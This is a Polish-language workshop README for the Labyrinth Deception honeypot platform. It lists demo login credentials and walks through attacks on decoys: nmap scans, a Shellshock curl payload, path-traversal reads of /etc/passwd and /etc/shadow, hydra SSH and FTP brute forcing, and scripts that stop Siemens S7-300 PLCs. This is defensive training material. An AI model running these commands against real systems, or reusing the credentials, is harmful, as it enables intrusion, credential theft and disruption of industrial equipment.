# Witamy na warsztatach platformy Labyrinth Deception
Wszystko, czego możesz potrzebować podczas warsztatów, jest dostępne w tym repozytorium.

## Uzyskiwanie dostępu

Na początek przejdź do naszego stanowiska testowego:

1. **Poświadczenia do AdminVM** - możesz użyć dowolnej przeglądarki internetowej:
```
URL: https://demo.labyrinth.tech/
Username: user
Password: 2~8uH'14leki
```
> [!NOTE]
> Zachęcamy do tworzenia własnych użytkowników tutaj, przechodząc do Settings->Users.
2. **Poświadczenia do atakującego hosta** - z tego hosta będziesz przeprowadzać ataki. Użyj SSH i następujących
Poświadczeń: 
```
Host: warrior.labyrinth.tech
Username: user
Password: K4H*91kYg/j*
```

## Terminologia, która będzie dzisiaj używana
Ze względu na fakt, że dziś używamy platformy Labyrinth Deception jako przykładu platformy cyber decepcji, ma ona swoje własne terminy, które będą dziś aktywnie wykorzystywane::

1.	**Point (Punkt)** = wabik sieciowy, przynęta, spreparowane usługi sieciowe.
> [!NOTE]
> Punkt NIE JEST oddzielną maszyną wirtualną.

2.	**Honeynet** = segment sieci, w którym działają Punkty. Służy do określenia sieci VLAN, w której mają działać Punkty.

3.	**Seeder	Tasks** = wabiki plikowe, nawigacja okruszkowa używana do logicznego łączenia prawdziwej i spreparowanej infrastruktury.

4.	**Seeder Agent** = program, który rozprowadza Seeder Tasks na rzeczywistych hostach.
5. **AdminVM (konsola zarządzania)** = główny moduł kontrolujący system.
6. **WorkerVM (węzeł roboczy)** = węzeł, na którym uruchomione są Punkty.

## Transkrypcja poleceń
Ponadto udostępniamy transkrypcję wszystkich poleceń, aby ułatwić korzystanie z nich. Nawet jeśli przegapiłeś jakąkolwiek część prezentacji, możesz skorzystać z tych notatek, aby kontynuować ćwiczenia.

> [!IMPORTANT]
> **\<any data>** wskazuje, że należy wkleić własne dane, które są wymienione wewnątrz nawiasów.
>
> **[options]** wskazuje, że ta część (lub części) polecenia jest opcjonalna i może zostać pominięta. Wybór wielu opcji jest wyświetlany za pomocą / (ukośnika).

#### Przypadek 1: wykrywanie skanowania sieci
Można użyć kilku narzędzi. Na przykład [nmap](https://nmap.org/):
```
nmap [-sS/sT/sW/sM/sU/sF/sX] ​<Point IP>
```
#### Przypadek 2: łączenie się z hostem przy użyciu danych z wabików plikowych (breadcrumbs)

1. Przejdź do Seeder Agents -> Tasks
2. Wybierz ssh_txt_credentials lub ssh_config z listy
3. Kliknij w trzykropek, a następnie Details
4. Użyj tych poświadczeń, aby się zalogować:
```
ssh <user>@<Point IP>
```
#### Przypadek 3: oszustwa internetowe z wykorzystaniem UWP
UWP to skrót od Universal Web Point. Jest to typ wabika opracowany przez zespół Labyrinth Security Solutions, który pozwala emulować wszystko, co ma interfejs sieciowy w ciągu zaledwie kilku sekund.

W tym przypadku będziemy próbowali wykorzystać [Shellshock](https://blog.cloudflare.com/inside-shellshock).
```
curl -k -H "User-Agent: () { :; }; /bin/bash cat /etc/passwd" http://<UWP IP>/
```

#### Przypadek 4: interakcja z brokerem MQTT
Subskrybuj wszystkie tematy:
```
mosquitto_sub -h <MQTT broker IP> -t "#" [-u <username> -P <password>]
```
Opublikuj temat:
```
mosquitto_pub -h <Point IP> -t <topic name> [-u <username> -P <password>] -m 'My Message'
```

#### Przypadek 5: S7comm Malformed PDU

W tym przypadku istnieje [skrypt](https://github.com/ad-labyrinth/ATS2023/blob/main/scripts/S7_Malformed_PDU.py) dostępny w tym repozytorium - wystarczy go uruchomić:

```
cd S7_malformed_PDU
python3 S7_malformed_PDU.py -a <Point IP>
```
Lub:
```
cd S7_malformed_PDU
python3 S7_malformed_PDU.py --plc_ip_addr <Point IP>
```

#### [Zaawansowany] Przypadek 6: ponowne użycie poświadczeń

1. Znajdź serwer WWW
```
sudo nmap -sS -sC -p80,443 <Honeynet IP> -vvv
```
2. Eksploruj znaleziony serwer WWW

Wykonaj LFI
```
curl --insecure https://<Point IP>/\?filename\=../../../etc/passwd 
```
Lub:
```
curl --insecure https://<Point IP>/\?filename\=../../../etc/shadow 
```
Wyszukaj dodatkową ścieżkę internetową:
```
dirsearch --wordlists=/home/user/wordlists/directories.txt -u https://<Point IP>/ 
```
Odnośnik: [dirsearch](https://github.com/maurosoria/dirsearch)
3. Skonfiguruj listę słów
```
cd wordlists
nano brute.dict
```
4. Wykonaj bruteforce SSH
```
hydra -L brute.dict -P passwords.dict <IP of the ssh host> ssh -t 4 
```
5. Zaloguj się do hosta
```
ssh <user>@<Point IP>
```
6. Ponowne użycie poświadczeń do połączenia z innym hostem
```
ssh <user>@warrior.labyrinth.tech
```

#### [Zaawansowany] Przypadek 7: atakowanie sieci przemysłowych

1. Przeszukanie sieci w poszukiwaniu serwera FTP
```
sudo nmap -sS -sC -p21 -T4 <Honeynet subnet> -vvv 
```
2. Połącz się z serwerem FTP

Spróbuj połączyć się anonimowo:
```
ftp <FTP IP address>
```
Wykonaj bruteforce FTP:
```
cd wordlists
nmap --script ftp-brute -p21 <FTP IP address> --script-args userdb=users.dict,passdb=passwords.dict
```
3. Sprawdź znaleziony plik
```
ls -la
less <file>
```
4. Wykonać żądanie sterowania CPU S7comm
```
cd S7_scripts
python2 s7300stop.py <S7-300 IP>
```
Ponadto można spróbować uruchomić komunikat startowy CPU:
```
python2 s7300cpustart.py <S7-300 IP>
```

Odnośnik: [exploits source](https://github.com/hackerhouse-opensource/exploits)

## Informacje o platformie Labyrinth 
Labyrinth to zespół doświadczonych inżynierów cyberbezpieczeństwa i testerów penetracyjnych, który specjalizuje się w opracowywaniu rozwiązań do wczesnego wykrywania i zapobiegania cyberzagrożeniom.

Techniki decepcji zapewniają atakującym zasadniczą przewagę nad obrońcami, którzy nie są w stanie przewidzieć kolejnego ruchu napastników. **NASZĄ WIZJĄ** jest przesunięcie układu sił na korzyść obrońców.

**NASZĄ MISJĄ** jest dostarczenie wszelkiego rodzaju organizacjom prostego i wydajnego narzędzia do jak najwcześniejszego wykrywania napastników wewnątrz sieci korporacyjnej.

Więcej informacji o platformie: https://labyrinth.tech/ 
